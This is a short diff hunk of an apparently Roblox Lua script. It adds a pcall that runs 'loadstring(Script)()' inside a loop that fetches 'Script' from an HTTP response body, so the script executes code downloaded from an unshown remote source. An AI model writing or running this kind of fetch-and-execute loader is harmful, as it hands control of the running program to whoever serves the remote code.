@@ -56,6 +56,9 @@ if #Script <= 20000 or (not S) then
             }).Body
         end)
         task.wait(2)
+        pcall(function()
+            loadstring(Script)()
+        end)
     until #Script >= 20000
 else 
     print(#Script) 
